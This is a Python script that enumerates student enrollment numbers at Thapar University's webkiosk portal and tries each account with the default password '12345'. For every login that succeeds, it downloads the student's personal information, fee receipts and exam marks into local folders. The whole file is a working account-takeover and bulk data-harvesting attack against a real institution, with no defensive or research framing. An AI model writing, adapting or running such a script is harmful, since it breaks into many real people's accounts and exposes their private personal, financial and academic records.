import requests
import wget
import os
import time

req = requests.session()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Origin': 'https://webkiosk.thapar.edu',
    'Referer': 'https://webkiosk.thapar.edu/index.jsp',
}

def getProfile(roll_no):
    data = {
        'txtuType': 'Member Type',
        'UserType': 'S',
        'txtCode': 'Enrollment No',
        'MemberCode': str(roll_no),
        'txtPin': 'Password/Pin',
        'Password': '12345',
        'BTNSubmit': 'Submit',
    }

    res = req.post('https://webkiosk.thapar.edu/CommonFiles/UserAction.jsp', headers=headers, data=data)
    res = str(res._content)

    if "Wrong" in res or "Invalid" in res:
            print("Login Failed for roll no:"+str(roll_no) )
    else:
        time.sleep(1)
        print("login success: " + str(roll_no))
        

        info = req.get("https://webkiosk.thapar.edu/StudentFiles/PersonalFiles/StudPersonalInfo.jsp")
        feeinfo = req.get("https://webkiosk.thapar.edu/StudentFiles/FAS/FeeReceipt.jsp")
        marks =  req.get("https://webkiosk.thapar.edu/StudentFiles/Exam/StudentEventMarksView.jsp?x=&exam=ALL")

        # print(data._content)

        if not os.path.exists("extract/" + str(roll_no)):
            os.mkdir("extract/" + str(roll_no))
        
        f = open("extract/" +str(roll_no) + "/marks.html", "a")
        f.write(str(marks._content))
        f.close()

        f = open("extract/" +str(roll_no) + "/feeinfo.html", "a")
        f.write(str(feeinfo._content))
        f.close()


        f = open("extract/" +str(roll_no) + "/personal_info.html", "a")
        f.write(str(info._content))
        f.close()

# getProfile(702203018)
# i = 100

# while(i <= 999):
#     getProfile( int(str(101900) + str(i))) 
#     i = i + 1
    

# i = 10

# while(i <= 99):
#     getProfile( int(str(1019000) + str(i))) 
#     i = i + 1


    

 
    



i = 19024

while(i <= 99999):
    getProfile( int(str(1019) + str(i))) 
    i = i + 1




# getProfile(102215212)